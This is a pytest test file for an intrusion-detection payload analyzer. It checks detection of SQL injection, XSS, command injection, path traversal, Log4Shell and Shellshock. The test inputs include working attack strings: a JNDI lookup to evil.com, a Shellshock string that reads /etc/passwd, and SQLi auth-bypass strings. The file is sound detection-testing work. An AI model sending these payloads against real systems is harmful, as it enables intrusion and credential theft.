"""Tests for payload feature extraction."""

import numpy as np
import pytest

from src.features.payload_analyzer import (
    extract_payload_features,
    analyze_payload,
    PAYLOAD_FEATURE_NAMES,
    PATTERN_NAMES,
)


def test_feature_names_count():
    assert len(PAYLOAD_FEATURE_NAMES) == 10


def test_empty_payloads():
    vec = extract_payload_features([])
    assert vec.shape == (10,)
    assert np.all(vec == 0.0)


def test_benign_payload():
    vec = extract_payload_features([b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n"])
    assert vec.shape == (10,)
    # No patterns should match
    assert vec[6] == 0.0  # pattern_match_count
    # Should have some entropy and length
    assert vec[7] > 0.0   # max_payload_entropy
    assert vec[8] > 0.0   # mean_payload_length


def test_sqli_detected():
    vec = extract_payload_features([b"GET /search?q=1' UNION SELECT * FROM users-- HTTP/1.1"])
    assert vec[0] == 1.0   # has_sqli
    assert vec[6] >= 1.0   # pattern_match_count


def test_xss_detected():
    vec = extract_payload_features([b"POST /comment body=<script>alert(1)</script>"])
    assert vec[1] == 1.0   # has_xss
    assert vec[6] >= 1.0


def test_multiple_patterns():
    payload = b"<script>alert(1)</script>; cat /etc/passwd | grep root"
    vec = extract_payload_features([payload])
    assert vec[1] == 1.0   # has_xss
    assert vec[2] == 1.0   # has_cmdi
    assert vec[6] >= 2.0   # at least 2 patterns


def test_multiple_payloads_aggregated():
    payloads = [
        b"GET /index.html HTTP/1.1",
        b"GET /search?q=' UNION SELECT * FROM users-- HTTP/1.1",
    ]
    vec = extract_payload_features(payloads)
    assert vec[0] == 1.0   # sqli found in second payload
    assert vec[8] > 0.0    # mean_payload_length across both


def test_suspicious_char_ratio():
    # Payload with many control characters
    payload = bytes(range(0, 16)) * 10  # 160 bytes of control chars
    vec = extract_payload_features([payload])
    # 0x09, 0x0A, 0x0D are excluded from suspicious count = 3 bytes * 10 = 30 non-suspicious
    # 13 suspicious chars * 10 = 130 suspicious out of 160
    assert vec[9] > 0.5


def test_path_traversal_detected():
    vec = extract_payload_features([b"GET /../../etc/passwd HTTP/1.1"])
    assert vec[3] == 1.0   # has_traversal


def test_pattern_names_match_patterns():
    assert len(PATTERN_NAMES) == 6


def test_extended_feature_names_length():
    """EXTENDED_FEATURE_NAMES should be 76 flow + 10 payload = 86."""
    from src.engines.supervised import EXTENDED_FEATURE_NAMES
    from src.features.flow_extractor import FLOW_FEATURE_NAMES
    from src.features.payload_analyzer import PAYLOAD_FEATURE_NAMES
    assert len(EXTENDED_FEATURE_NAMES) == 86
    assert EXTENDED_FEATURE_NAMES[:76] == FLOW_FEATURE_NAMES
    assert EXTENDED_FEATURE_NAMES[76:] == PAYLOAD_FEATURE_NAMES


def test_log4j_detected():
    vec = extract_payload_features([b"GET /${jndi:ldap://evil.com/a} HTTP/1.1"])
    assert vec[4] == 1.0   # has_log4j
    assert vec[6] >= 1.0


def test_shellshock_detected():
    vec = extract_payload_features([b"() { :;}; /bin/bash -c 'cat /etc/passwd'"])
    assert vec[5] == 1.0   # has_shellshock
    assert vec[6] >= 1.0


def test_analyze_payload_with_raw_packet():
    from unittest.mock import MagicMock
    from scapy.all import Raw
    pkt = MagicMock()
    pkt.__contains__ = lambda self, layer: layer is Raw
    pkt.__getitem__ = lambda self, layer: MagicMock(load=b"' UNION SELECT * FROM users--")
    matches = analyze_payload(pkt)
    assert "sql_injection" in matches


def test_analyze_payload_no_raw():
    from unittest.mock import MagicMock
    from scapy.all import Raw
    pkt = MagicMock()
    pkt.__contains__ = lambda self, layer: False
    assert analyze_payload(pkt) == []


def test_analyze_payload_classic_sqli_without_keywords():
    """Regression: `' OR '1'='1'--` has no 'select'/'union' keyword, only the
    bare-quote and `;--`-style alternatives of the sql_injection pattern. A
    prescreen that only checked for keyword literals let this — one of the
    most common SQLi payloads in existence — bypass detection entirely,
    because analyze_payload() short-circuited before the real patterns ever
    ran."""
    from unittest.mock import MagicMock
    from scapy.all import Raw
    pkt = MagicMock()
    pkt.__contains__ = lambda self, layer: layer is Raw
    pkt.__getitem__ = lambda self, layer: MagicMock(
        load=b"username=admin' OR '1'='1'--&password=x"
    )
    assert "sql_injection" in analyze_payload(pkt)


def test_sqli_auth_bypass_comment_out():
    """`admin'--` (comment out the rest of the query) has no `;` before the
    `--`, so the old `;--` alternative missed this classic auth-bypass
    payload even though it isn't the bare-quote pattern being tested above."""
    vec = extract_payload_features([b"username=admin'--&password=anything"])
    assert vec[0] == 1.0  # has_sqli


def test_benign_apostrophe_not_flagged_as_sqli():
    """Regression: the old `'.*?'` alternative matched *any* two single
    quotes with anything between — including a plain apostrophe in normal
    text (e.g. an mDNS device name like "Roberto's iPhone" or "O'Brien's
    account"), which surfaced as a real false positive once sql_injection
    became a CRITICAL_RULES override. The tightened pattern only matches
    quotes anchored to actual SQLi syntax (boolean OR/AND, tautology '=',
    or comment/statement termination)."""
    vec = extract_payload_features([b"device_name=Roberto's iPhone"])
    assert vec[0] == 0.0  # has_sqli
    vec2 = extract_payload_features([b"user=O'Brien's account settings"])
    assert vec2[0] == 0.0  # has_sqli
